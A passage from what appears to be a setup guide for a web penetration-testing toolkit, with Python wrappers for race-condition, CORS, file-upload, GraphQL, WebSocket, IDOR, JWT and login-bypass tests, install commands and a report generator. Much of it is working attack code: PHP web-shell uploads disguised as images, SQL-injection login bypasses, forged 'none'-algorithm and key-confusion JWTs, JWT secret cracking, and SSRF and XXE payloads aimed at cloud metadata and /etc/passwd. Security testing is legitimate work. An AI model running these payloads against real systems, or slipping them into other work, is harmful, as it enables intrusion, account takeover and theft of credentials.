        results = asyncio.run(
            self._race_requests(url, method, data, headers, parallel_requests)
        )

        # Analyze results
        status_codes = [r[1] for r in results]
        response_lengths = [len(r[0]) for r in results]

        return {
            'total_requests': len(results),
            'status_codes': status_codes,
            'unique_statuses': list(set(status_codes)),
            'response_lengths': response_lengths,
            'length_variance': max(response_lengths) - min(response_lengths) if response_lengths else 0,
            'potential_vuln': len(set(status_codes)) > 1 or (max(response_lengths) - min(response_lengths) > 100)
        }

    def test_limit_overrun(self, url, method='POST', data=None, headers=None,
                          expected_limit=1, parallel_requests=20):
        """Test for limit overrun vulnerabilities."""
        results = self.test_race(url, method, data, headers, parallel_requests)

        success_count = results['status_codes'].count(200)
        results['success_count'] = success_count
        results['expected_limit'] = expected_limit
        results['limit_exceeded'] = success_count > expected_limit

        return results
```

### File: `wrappers/advanced/cors_tester.py`
```python
"""CORS misconfiguration testing wrapper."""
from utils.base_wrapper import BaseToolWrapper
import requests

class CORSTester(BaseToolWrapper):
    TEST_ORIGINS = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://{target}.evil.com",
        "https://evil{target}",
        "https://{target}evil.com",
        "https://evil.com.{target}",
    ]

    @property
    def tool_name(self) -> str:
        return "cors_tester"

    def test_cors(self, url):
        """Test for CORS misconfigurations."""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        target_domain = parsed.netloc

        results = []

        for origin_template in self.TEST_ORIGINS:
            origin = origin_template.replace('{target}', target_domain)

            try:
                response = requests.get(
                    url,
                    headers={'Origin': origin},
                    timeout=10
                )

                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')

                vuln_level = self._assess_vulnerability(origin, acao, acac)

                results.append({
                    'origin_tested': origin,
                    'acao_header': acao,
                    'acac_header': acac,
                    'reflected': origin == acao,
                    'wildcard': acao == '*',
                    'credentials_allowed': acac.lower() == 'true',
                    'vulnerability_level': vuln_level
                })
            except Exception as e:
                results.append({'origin_tested': origin, 'error': str(e)})

        return results

    def _assess_vulnerability(self, origin, acao, acac):
        """Assess CORS vulnerability severity."""
        if not acao:
            return 'none'

        if acao == '*' and acac.lower() == 'true':
            return 'critical'  # Wildcard with credentials (invalid but some servers)

        if origin == acao and acac.lower() == 'true':
            return 'high'  # Reflected origin with credentials

        if origin == acao:
            return 'medium'  # Reflected origin without credentials

        if acao == '*':
            return 'low'  # Wildcard without credentials

        return 'none'
```

### File: `wrappers/advanced/file_upload_bypass.py`
```python
"""File upload bypass testing wrapper."""
from utils.base_wrapper import BaseToolWrapper
import requests
import io

class FileUploadBypass(BaseToolWrapper):
    BYPASS_TECHNIQUES = {
        'double_extension': [
            'shell.php.jpg',
            'shell.php.png',
            'shell.jpg.php',
            'shell.php%00.jpg',
            'shell.php\x00.jpg',
        ],
        'case_manipulation': [
            'shell.pHp',
            'shell.PhP',
            'shell.PHP',
            'shell.pHP',
        ],
        'special_extensions': [
            'shell.php5',
            'shell.php7',
            'shell.phtml',
            'shell.phar',
            'shell.phps',
            'shell.php.bak',
        ],
        'content_type_bypass': [
            ('shell.php', 'image/jpeg'),
            ('shell.php', 'image/png'),
            ('shell.php', 'image/gif'),
            ('shell.php', 'application/octet-stream'),
        ],
        'magic_bytes': {
            'gif': b'GIF89a<?php system($_GET["cmd"]); ?>',
            'png': b'\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>',
            'jpg': b'\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>',
        }
    }

    @property
    def tool_name(self) -> str:
        return "file_upload_bypass"

    def test_upload(self, url, file_param='file', additional_data=None):
        """Test file upload bypass techniques."""
        results = []
        php_content = b'<?php echo "UPLOAD_SUCCESS"; system($_GET["cmd"]); ?>'

        # Test double extensions
        for filename in self.BYPASS_TECHNIQUES['double_extension']:
            result = self._upload_file(url, file_param, filename, php_content,
                                       'application/x-php', additional_data)
            results.append({'technique': 'double_extension', 'filename': filename, **result})

        # Test case manipulation
        for filename in self.BYPASS_TECHNIQUES['case_manipulation']:
            result = self._upload_file(url, file_param, filename, php_content,
                                       'application/x-php', additional_data)
            results.append({'technique': 'case_manipulation', 'filename': filename, **result})

        # Test special extensions
        for filename in self.BYPASS_TECHNIQUES['special_extensions']:
            result = self._upload_file(url, file_param, filename, php_content,
                                       'application/x-php', additional_data)
            results.append({'technique': 'special_extension', 'filename': filename, **result})

        # Test content-type bypass
        for filename, content_type in self.BYPASS_TECHNIQUES['content_type_bypass']:
            result = self._upload_file(url, file_param, filename, php_content,
                                       content_type, additional_data)
            results.append({'technique': 'content_type', 'filename': filename,
                          'content_type': content_type, **result})

        # Test magic bytes
        for img_type, payload in self.BYPASS_TECHNIQUES['magic_bytes'].items():
            filename = f'shell.{img_type}.php'
            result = self._upload_file(url, file_param, filename, payload,
                                       f'image/{img_type}', additional_data)
            results.append({'technique': 'magic_bytes', 'filename': filename,
                          'image_type': img_type, **result})

        return results

    def _upload_file(self, url, file_param, filename, content, content_type, additional_data):
        """Upload file and check result."""
        try:
            files = {file_param: (filename, io.BytesIO(content), content_type)}
            data = additional_data or {}

            response = requests.post(url, files=files, data=data, timeout=15)

            return {
                'status_code': response.status_code,
                'response_length': len(response.text),
                'upload_success': 'success' in response.text.lower() or response.status_code == 200,
                'response_preview': response.text[:200]
            }
        except Exception as e:
            return {'error': str(e)}
```

### File: `utils/oob_callback.py`
```python
"""Out-of-Band callback infrastructure using Interactsh."""
import subprocess
import json
import uuid
import threading
import time

class OOBCallback:
    def __init__(self):
        self.callback_url = None
        self.interactions = []
        self.process = None
        self.running = False

    def start(self):
        """Start Interactsh client."""
        try:
            self.process = subprocess.Popen(
                ['interactsh-client', '-json', '-v'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Read the callback URL from first line
            first_line = self.process.stdout.readline()
            if 'oast' in first_line or 'interact' in first_line:
                self.callback_url = first_line.strip()

            self.running = True

            # Start background thread to collect interactions
            self.collector_thread = threading.Thread(target=self._collect_interactions)
            self.collector_thread.daemon = True
            self.collector_thread.start()

            return self.callback_url
        except FileNotFoundError:
            raise RuntimeError("interactsh-client not found. Install with: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")

    def _collect_interactions(self):
        """Background thread to collect interactions."""
        while self.running and self.process:
            line = self.process.stdout.readline()
            if line:
                try:
                    interaction = json.loads(line)
                    self.interactions.append(interaction)
                except json.JSONDecodeError:
                    pass

    def get_unique_url(self, identifier=None):
        """Get unique callback URL for tracking."""
        if not self.callback_url:
            raise RuntimeError("OOB callback not started")

        unique_id = identifier or str(uuid.uuid4())[:8]
        # Prepend unique ID as subdomain
        return f"http://{unique_id}.{self.callback_url}"

    def check_interactions(self, identifier=None):
        """Check for interactions, optionally filtered by identifier."""
        if identifier:
            return [i for i in self.interactions if identifier in str(i)]
        return self.interactions

    def stop(self):
        """Stop the callback server."""
        self.running = False
        if self.process:
            self.process.terminate()
            self.process = None

    def wait_for_interaction(self, timeout=30, identifier=None):
        """Wait for an interaction with timeout."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            interactions = self.check_interactions(identifier)
            if interactions:
                return interactions
            time.sleep(1)
        return []
```

## 3.5.3 Create Payload Files
```bash
mkdir -p config/payloads/advanced/{ssrf,xxe,deserialization,smuggling}

# Create SSRF payloads
cat > config/payloads/advanced/ssrf/cloud_metadata.txt << 'EOF'
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/v1/
EOF

# Create XXE payloads file
cat > config/payloads/advanced/xxe/basic.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF
```

## 3.5.4 Validation
```bash
# Test installations
interactsh-client -version
python3 ~/tools/SSRFmap/ssrfmap.py --help
python3 ~/tools/Corsy/corsy.py --help
python3 ~/tools/smuggler/smuggler.py --help

# Test Python imports
python3 -c "import aiohttp; print('aiohttp OK')"
python3 -c "import magic; print('python-magic OK')"
```

---

# PHASE 4: API & Modern Application Testing

## 4.1 Tool Installation

```bash
# Kiterunner - API endpoint discovery
go install github.com/assetnote/kiterunner/cmd/kr@latest

# Newman - Postman CLI
npm install -g newman

# GraphQL tools
pip install graphql-core gql

# WebSocket testing
pip install websocket-client websockets

# OpenAPI/Swagger parser
pip install openapi-spec-validator prance

# JWT tools
pip install pyjwt python-jose
go install github.com/ticarpi/jwt_tool@latest
```

## 4.2 Create Wrapper Files

### File: `wrappers/api/kiterunner.py`
```python
"""Kiterunner wrapper for API endpoint discovery."""
from utils.base_wrapper import APITool

class KiterunnerWrapper(APITool):
    @property
    def tool_name(self) -> str:
        return "kr"

    def _build_target_args(self) -> list:
        args = ["scan", self.target]

        if self.options.get("wordlist"):
            args.extend(["-w", self.options["wordlist"]])
        if self.options.get("kitebuilder_list"):
            args.extend(["-A", self.options["kitebuilder_list"]])
        if self.options.get("threads"):
            args.extend(["-x", str(self.options["threads"])])
        if self.options.get("delay"):
            args.extend(["--delay", str(self.options["delay"])])

        args.extend(["-o", "json", "--output", self.output_file])
        return args
```

### File: `wrappers/api/graphql_tester.py`
```python
"""GraphQL security testing wrapper."""
from utils.base_wrapper import APITool
import requests
import json

class GraphQLTester(APITool):
    INTROSPECTION_QUERY = '''
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          fields {
            name
            args { name type { name } }
          }
        }
      }
    }
    '''

    INJECTION_PAYLOADS = [
        '{"query": "{ __typename }"}',
        '{"query": "{ user(id: \\"1\\") { name } }"}',
        '{"query": "{ user(id: \\"1\' OR \\'1\\'=\\'1\\") { name } }"}',
        '{"query": "mutation { deleteUser(id: \\"1\\") }"}',
    ]

    @property
    def tool_name(self) -> str:
        return "graphql_tester"

    def test_introspection(self, url):
        """Test if introspection is enabled."""
        try:
            response = requests.post(
                url,
                json={'query': self.INTROSPECTION_QUERY},
                headers={'Content-Type': 'application/json'},
                timeout=15
            )

            data = response.json()
            introspection_enabled = '__schema' in str(data)

            return {
                'introspection_enabled': introspection_enabled,
                'status_code': response.status_code,
                'schema': data if introspection_enabled else None
            }
        except Exception as e:
            return {'error': str(e)}

    def test_injection(self, url):
        """Test for GraphQL injection vulnerabilities."""
        results = []

        for payload in self.INJECTION_PAYLOADS:
            try:
                response = requests.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )

                results.append({
                    'payload': payload,
                    'status_code': response.status_code,
                    'response': response.text[:500],
                    'potential_vuln': 'error' in response.text.lower()
                })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})

        return results

    def test_dos(self, url, depth=10):
        """Test for query complexity/DoS vulnerabilities."""
        # Build nested query
        nested_query = '{ __typename ' + '{ __typename ' * depth + '}' * depth + '}'

        try:
            response = requests.post(
                url,
                json={'query': nested_query},
                headers={'Content-Type': 'application/json'},
                timeout=30
            )

            return {
                'depth_tested': depth,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'potential_dos': response.elapsed.total_seconds() > 5
            }
        except Exception as e:
            return {'error': str(e), 'potential_dos': True}
```

### File: `wrappers/api/websocket_tester.py`
```python
"""WebSocket security testing wrapper."""
from utils.base_wrapper import APITool
import websocket
import json
import ssl

class WebSocketTester(APITool):
    @property
    def tool_name(self) -> str:
        return "websocket_tester"

    def test_connection(self, url, headers=None):
        """Test WebSocket connection."""
        try:
            ws = websocket.create_connection(
                url,
                header=headers or [],
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )
            ws.close()
            return {'connectable': True, 'url': url}
        except Exception as e:
            return {'connectable': False, 'error': str(e)}

    def test_auth_bypass(self, url):
        """Test WebSocket without authentication."""
        results = []

        # Test without any headers
        result = self.test_connection(url)
        result['test'] = 'no_auth'
        results.append(result)

        # Test with empty token
        result = self.test_connection(url, headers=['Authorization: Bearer '])
        result['test'] = 'empty_token'
        results.append(result)

        # Test with invalid token
        result = self.test_connection(url, headers=['Authorization: Bearer invalid'])
        result['test'] = 'invalid_token'
        results.append(result)

        return results

    def fuzz_messages(self, url, payloads, headers=None):
        """Send fuzzing payloads through WebSocket."""
        results = []

        try:
            ws = websocket.create_connection(
                url,
                header=headers or [],
                sslopt={"cert_reqs": ssl.CERT_NONE}
            )

            for payload in payloads:
                try:
                    ws.send(payload)
                    response = ws.recv()
                    results.append({
                        'payload': payload,
                        'response': response[:500],
                        'success': True
                    })
                except Exception as e:
                    results.append({
                        'payload': payload,
                        'error': str(e),
                        'success': False
                    })

            ws.close()
        except Exception as e:
            return [{'error': f'Connection failed: {str(e)}'}]

        return results
```

### File: `wrappers/api/openapi_analyzer.py`
```python
"""OpenAPI/Swagger specification analyzer."""
from utils.base_wrapper import APITool
import requests
import json
import yaml

class OpenAPIAnalyzer(APITool):
    COMMON_SPEC_PATHS = [
        '/swagger.json',
        '/swagger.yaml',
        '/api-docs',
        '/api/swagger.json',
        '/v1/swagger.json',
        '/v2/swagger.json',
        '/openapi.json',
        '/openapi.yaml',
        '/api/openapi.json',
        '/docs/swagger.json',
        '/.well-known/openapi.json',
    ]

    @property
    def tool_name(self) -> str:
        return "openapi_analyzer"

    def find_spec(self, base_url):
        """Find OpenAPI specification."""
        for path in self.COMMON_SPEC_PATHS:
            url = f"{base_url.rstrip('/')}{path}"
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    try:
                        if path.endswith('.yaml'):
                            spec = yaml.safe_load(response.text)
                        else:
                            spec = response.json()

                        if 'openapi' in spec or 'swagger' in spec:
                            return {'found': True, 'url': url, 'spec': spec}
                    except:
                        pass
            except:
                pass

        return {'found': False}

    def analyze_spec(self, spec):
        """Analyze OpenAPI spec for security issues."""
        issues = []
        endpoints = []

        # Extract endpoints
        paths = spec.get('paths', {})
        for path, methods in paths.items():
            for method, details in methods.items():
                if method in ['get', 'post', 'put', 'delete', 'patch']:
                    endpoint = {
                        'path': path,
                        'method': method.upper(),
                        'parameters': details.get('parameters', []),
                        'security': details.get('security', [])
                    }
                    endpoints.append(endpoint)

                    # Check for security issues
                    if not details.get('security'):
                        issues.append({
                            'type': 'no_security',
                            'endpoint': f'{method.upper()} {path}',
                            'severity': 'medium'
                        })

                    # Check for sensitive operations without auth
                    if method in ['post', 'put', 'delete'] and not details.get('security'):
                        issues.append({
                            'type': 'sensitive_no_auth',
                            'endpoint': f'{method.upper()} {path}',
                            'severity': 'high'
                        })

        # Check global security
        if not spec.get('security') and not spec.get('securityDefinitions'):
            issues.append({
                'type': 'no_global_security',
                'severity': 'medium'
            })

        return {
            'endpoints': endpoints,
            'total_endpoints': len(endpoints),
            'issues': issues
        }
```

## 4.3 Validation
```bash
# Test tools
kr --help
newman --version
python3 -c "from gql import gql; print('GraphQL OK')"
python3 -c "import websocket; print('WebSocket OK')"
```

---

# PHASE 5: Authentication & Authorization Testing

## 5.1 Tool Installation

```bash
# Hydra for brute forcing
sudo apt install hydra -y
# Or build from source
cd ~/tools
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra && ./configure && make && sudo make install

# JWT tools
pip install pyjwt python-jose
cd ~/tools
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip install -r requirements.txt

# Password lists
cd config/wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt
```

## 5.2 Create Wrapper Files

### File: `wrappers/auth/auth_bypass.py`
```python
"""Authentication bypass testing wrapper."""
from utils.base_wrapper import AuthTool
import requests

class AuthBypassTester(AuthTool):
    BYPASS_TECHNIQUES = {
        'sql_injection': [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "admin' OR '1'='1'--",
            "') OR ('1'='1",
        ],
        'default_credentials': [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest'),
        ],
        'header_bypass': [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
        ],
        'path_bypass': [
            '/admin',
            '/admin/',
            '/admin/.',
            '//admin',
            '/./admin',
            '/admin%20',
            '/admin%09',
            '/admin..;/',
        ]
    }

    @property
    def tool_name(self) -> str:
        return "auth_bypass"

    def test_sql_bypass(self, url, username_field='username', password_field='password'):
        """Test SQL injection authentication bypass."""
        results = []

        for payload in self.BYPASS_TECHNIQUES['sql_injection']:
            data = {username_field: payload, password_field: 'anything'}
            try:
                response = requests.post(url, data=data, timeout=10, allow_redirects=False)
                results.append({
                    'payload': payload,
                    'status_code': response.status_code,
                    'redirect': response.headers.get('Location', ''),
                    'potential_bypass': response.status_code in [301, 302, 303] or 'dashboard' in response.text.lower()
                })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})

        return results

    def test_default_creds(self, url, username_field='username', password_field='password'):
        """Test default credentials."""
        results = []

        for username, password in self.BYPASS_TECHNIQUES['default_credentials']:
            data = {username_field: username, password_field: password}
            try:
                response = requests.post(url, data=data, timeout=10, allow_redirects=False)
                results.append({
                    'username': username,
                    'password': password,
                    'status_code': response.status_code,
                    'potential_success': response.status_code in [301, 302, 303]
                })
            except Exception as e:
                results.append({'username': username, 'error': str(e)})

        return results

    def test_header_bypass(self, url):
        """Test header-based authentication bypass."""
        results = []

        for headers in self.BYPASS_TECHNIQUES['header_bypass']:
            try:
                response = requests.get(url, headers=headers, timeout=10)
                results.append({
                    'headers': headers,
                    'status_code': response.status_code,
                    'potential_bypass': response.status_code == 200
                })
            except Exception as e:
                results.append({'headers': headers, 'error': str(e)})

        return results
```

### File: `wrappers/auth/idor_tester.py`
```python
"""IDOR (Insecure Direct Object Reference) testing wrapper."""
from utils.base_wrapper import AuthTool
import requests
import re

class IDORTester(AuthTool):
    @property
    def tool_name(self) -> str:
        return "idor_tester"

    def test_numeric_idor(self, url, param_name, start_id=1, count=10, headers=None):
        """Test for numeric IDOR vulnerabilities."""
        results = []
        headers = headers or {}

        for i in range(start_id, start_id + count):
            test_url = url.replace(f'{{{param_name}}}', str(i))
            if f'{{{param_name}}}' not in url:
                test_url = f"{url}?{param_name}={i}"

            try:
                response = requests.get(test_url, headers=headers, timeout=10)
                results.append({
                    'id': i,
                    'url': test_url,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'accessible': response.status_code == 200
                })
            except Exception as e:
                results.append({'id': i, 'error': str(e)})

        return results

    def test_uuid_idor(self, url, known_uuid, test_uuids, headers=None):
        """Test IDOR with UUIDs."""
        results = []
        headers = headers or {}

        # Get baseline with known UUID
        baseline_url = url.replace('{uuid}', known_uuid)
        baseline_response = requests.get(baseline_url, headers=headers, timeout=10)

        for test_uuid in test_uuids:
            test_url = url.replace('{uuid}', test_uuid)
            try:
                response = requests.get(test_url, headers=headers, timeout=10)
                results.append({
                    'uuid': test_uuid,
                    'status_code': response.status_code,
                    'accessible': response.status_code == 200,
                    'same_as_baseline': response.text == baseline_response.text
                })
            except Exception as e:
                results.append({'uuid': test_uuid, 'error': str(e)})

        return results

    def test_horizontal_escalation(self, url, user1_token, user2_resources, headers=None):
        """Test horizontal privilege escalation."""
        results = []
        headers = headers or {}
        headers['Authorization'] = f'Bearer {user1_token}'

        for resource in user2_resources:
            try:
                response = requests.get(resource, headers=headers, timeout=10)
                results.append({
                    'resource': resource,
                    'status_code': response.status_code,
                    'accessible': response.status_code == 200,
                    'vulnerability': 'horizontal_escalation' if response.status_code == 200 else None
                })
            except Exception as e:
                results.append({'resource': resource, 'error': str(e)})

        return results
```

### File: `wrappers/auth/jwt_tester.py`
```python
"""JWT security testing wrapper."""
from utils.base_wrapper import AuthTool
import jwt
import json
import base64
import hmac
import hashlib

class JWTTester(AuthTool):
    @property
    def tool_name(self) -> str:
        return "jwt_tester"

    def decode_jwt(self, token):
        """Decode JWT without verification."""
        parts = token.split('.')
        if len(parts) != 3:
            return {'error': 'Invalid JWT format'}

        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            return {
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }
        except Exception as e:
            return {'error': str(e)}

    def test_none_algorithm(self, token):
        """Test 'none' algorithm bypass."""
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return decoded

        # Create token with 'none' algorithm
        header = {'alg': 'none', 'typ': 'JWT'}
        payload = decoded['payload']

        new_token = (
            base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') +
            '.' +
            base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') +
            '.'
        )

        return {
            'original_token': token,
            'none_alg_token': new_token,
            'test': 'none_algorithm'
        }

    def test_algorithm_confusion(self, token, public_key):
        """Test RS256 to HS256 algorithm confusion."""
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return decoded

        # Sign with public key as HMAC secret
        header = {'alg': 'HS256', 'typ': 'JWT'}
        payload = decoded['payload']

        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

        signature = hmac.new(
            public_key.encode(),
            f'{header_b64}.{payload_b64}'.encode(),
            hashlib.sha256
        ).digest()

        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

        return {
            'original_token': token,
            'confused_token': f'{header_b64}.{payload_b64}.{sig_b64}',
            'test': 'algorithm_confusion'
        }

    def test_weak_secret(self, token, wordlist_path):
        """Brute force weak JWT secrets."""
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return decoded

        if decoded['header'].get('alg') not in ['HS256', 'HS384', 'HS512']:
            return {'error': 'Not an HMAC-signed token'}

        with open(wordlist_path, 'r') as f:
            secrets = [line.strip() for line in f]

        for secret in secrets:
            try:
                jwt.decode(token, secret, algorithms=[decoded['header']['alg']])
                return {
                    'cracked': True,
                    'secret': secret,
                    'token': token
                }
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue

        return {'cracked': False, 'attempts': len(secrets)}

    def modify_payload(self, token, secret, modifications):
        """Modify JWT payload and re-sign."""
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return decoded

        payload = decoded['payload']
        payload.update(modifications)

        alg = decoded['header'].get('alg', 'HS256')
        new_token = jwt.encode(payload, secret, algorithm=alg)

        return {
            'original_token': token,
            'modified_token': new_token,
            'modifications': modifications
        }
```

## 5.3 Validation
```bash
# Test Hydra
hydra -h

# Test JWT tool
python3 ~/tools/jwt_tool/jwt_tool.py --help

# Test Python imports
python3 -c "import jwt; print('PyJWT OK')"
```

---

# PHASE 6: Reporting & Integration Enhancement

## 6.1 Tool Installation

```bash
# PDF generation
pip install reportlab weasyprint

# Database
pip install sqlalchemy alembic

# API framework (optional)
pip install fastapi uvicorn

# Additional reporting
pip install jinja2 markdown
```

## 6.2 Create Enhanced Reporter

### File: `utils/advanced_reporter.py`
```python
"""Advanced reporting with PDF generation and database storage."""
import json
import os
from datetime import datetime
from jinja2 import Template
import markdown

class AdvancedReporter:
    def __init__(self, output_dir='./output/reports'):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.findings = []

    def add_finding(self, title, severity, description, evidence=None,
                    remediation=None, cvss=None, cwe=None):
        """Add a security finding."""
        self.findings.append({
            'id': len(self.findings) + 1,
            'title': title,
            'severity': severity,
            'description': description,
            'evidence': evidence,
            'remediation': remediation,
            'cvss': cvss,
            'cwe': cwe,
            'timestamp': datetime.now().isoformat()
        })

    def generate_executive_summary(self):
        """Generate executive summary."""
        severity_counts = {
            'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0
        }

        for finding in self.findings:
            sev = finding['severity'].lower()
            if sev in severity_counts:
                severity_counts[sev] += 1

        return {
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'risk_score': self._calculate_risk_score(severity_counts),
            'generated_at': datetime.now().isoformat()
        }

    def _calculate_risk_score(self, severity_counts):
        """Calculate overall risk score."""
        weights = {'critical': 10, 'high': 7, 'medium': 4, 'low': 1, 'info': 0}
        total = sum(severity_counts[s] * weights[s] for s in severity_counts)
        max_possible = len(self.findings) * 10
        return round((total / max_possible) * 100, 2) if max_possible > 0 else 0

    def export_json(self, filename=None):
        """Export findings to JSON."""
        filename = filename or f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(self.output_dir, filename)

        report = {
            'executive_summary': self.generate_executive_summary(),
            'findings': self.findings
        }

        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)

        return filepath

    def export_html(self, filename=None):
        """Export findings to HTML."""
        filename = filename or f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        filepath = os.path.join(self.output_dir, filename)

        template = Template('''
<!DOCTYPE html>
<html>
<head>
    <title>Security Assessment Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .critical { color: #d00; background: #fee; }
        .high { color: #f60; background: #fff3e0; }
        .medium { color: #fc0; background: #fff8e1; }
        .low { color: #090; background: #e8f5e9; }
        .finding { border: 1px solid #ddd; margin: 20px 0; padding: 15px; border-radius: 5px; }
        .severity { padding: 3px 10px; border-radius: 3px; font-weight: bold; }
        h1 { color: #333; }
        .summary { background: #f5f5f5; padding: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Security Assessment Report</h1>
    <div class="summary">
        <h2>Executive Summary</h2>
        <p>Total Findings: {{ summary.total_findings }}</p>
        <p>Risk Score: {{ summary.risk_score }}%</p>
        <ul>
            <li>Critical: {{ summary.severity_breakdown.critical }}</li>
            <li>High: {{ summary.severity_breakdown.high }}</li>
            <li>Medium: {{ summary.severity_breakdown.medium }}</li>
            <li>Low: {{ summary.severity_breakdown.low }}</li>
        </ul>
    </div>

    <h2>Findings</h2>
    {% for finding in findings %}
    <div class="finding">
        <h3>{{ finding.id }}. {{ finding.title }}</h3>
        <span class="severity {{ finding.severity|lower }}">{{ finding.severity }}</span>
        <p><strong>Description:</strong> {{ finding.description }}</p>
        {% if finding.evidence %}
        <p><strong>Evidence:</strong><pre>{{ finding.evidence }}</pre></p>
        {% endif %}
        {% if finding.remediation %}
        <p><strong>Remediation:</strong> {{ finding.remediation }}</p>
        {% endif %}
    </div>
    {% endfor %}

    <footer>
        <p>Generated: {{ summary.generated_at }}</p>
    </footer>
</body>
</html>
        ''')

        html = template.render(
            summary=self.generate_executive_summary(),
            findings=self.findings
        )

        with open(filepath, 'w') as f:
            f.write(html)

        return filepath

    def export_markdown(self, filename=None):
        """Export findings to Markdown."""
        filename = filename or f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        filepath = os.path.join(self.output_dir, filename)

        summary = self.generate_executive_summary()

        md = f"""# Security Assessment Report

## Executive Summary

- **Total Findings**: {summary['total_findings']}
- **Risk Score**: {summary['risk_score']}%

### Severity Breakdown
| Severity | Count |
|----------|-------|
| Critical | {summary['severity_breakdown']['critical']} |
| High | {summary['severity_breakdown']['high']} |
| Medium | {summary['severity_breakdown']['medium']} |
| Low | {summary['severity_breakdown']['low']} |

## Findings

"""

        for finding in self.findings:
            md += f"""### {finding['id']}. {finding['title']}

**Severity**: {finding['severity']}

**Description**: {finding['description']}

"""
            if finding.get('evidence'):
                md += f"**Evidence**:\n```\n{finding['evidence']}\n```\n\n"

            if finding.get('remediation'):
                md += f"**Remediation**: {finding['remediation']}\n\n"

            md += "---\n\n"

        with open(filepath, 'w') as f:
            f.write(md)

        return filepath
```

## 6.3 Create Workflow Files

### File: `workflows/advanced_vulns.py`
```python
"""Advanced vulnerability testing workflow."""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wrappers.advanced.ssrf_tester import SSRFTester
from wrappers.advanced.xxe_injector import XXEInjector
from wrappers.advanced.cors_tester import CORSTester
from wrappers.advanced.race_condition import RaceConditionTester
from utils.advanced_reporter import AdvancedReporter
from utils.oob_callback import OOBCallback

class AdvancedVulnWorkflow:
    def __init__(self, target, output_dir='./output/advanced'):
        self.target = target
        self.output_dir = output_dir
        self.reporter = AdvancedReporter(output_dir)
        self.oob = None

    def run_full_scan(self, params=None):
        """Run all advanced vulnerability tests."""
        results = {}

        # Start OOB callback server
        try:
            self.oob = OOBCallback()
            callback_url = self.oob.start()
            print(f"[*] OOB Callback URL: {callback_url}")
        except Exception as e:
            print(f"[!] OOB callback not available: {e}")
            callback_url = None

        # SSRF Testing
        print("[*] Testing for SSRF...")
        ssrf = SSRFTester(self.target, self.output_dir)
        for param in (params or ['url', 'path', 'redirect', 'next']):
            ssrf_results = ssrf.test_ssrf(self.target, param, callback_url)
            results[f'ssrf_{param}'] = ssrf_results

            # Add findings
            for category, tests in ssrf_results.items():
                if isinstance(tests, list):
                    for test in tests:
                        if test.get('potential_vuln'):
                            self.reporter.add_finding(
                                f"Potential SSRF via {param}",
                                "High",
                                f"SSRF vulnerability detected with payload: {test.get('payload')}",
                                evidence=str(test)
                            )

        # XXE Testing
        print("[*] Testing for XXE...")
        xxe = XXEInjector(self.target, self.output_dir)
        xxe_results = xxe.test_xxe(self.target, callback_url)
        results['xxe'] = xxe_results

        for test in xxe_results:
            if test.get('potential_vuln'):
                self.reporter.add_finding(
                    f"Potential XXE ({test.get('type')})",
                    "Critical",
                    "XML External Entity injection detected",
                    evidence=test.get('response_preview')
                )

        # CORS Testing
        print("[*] Testing for CORS misconfiguration...")
